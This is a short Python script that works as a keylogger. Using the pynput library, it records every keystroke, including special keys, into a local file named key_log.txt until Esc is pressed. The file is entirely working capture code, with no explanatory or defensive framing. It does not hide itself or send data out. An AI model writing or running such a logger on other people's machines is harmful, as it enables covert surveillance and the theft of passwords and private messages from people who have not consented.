from pynput import keyboard

# Define the file to save the logged keystrokes
log_file = 'key_log.txt'

# Function to write the keystrokes to the file
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'[{key}]')

# Function to stop the keylogger
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
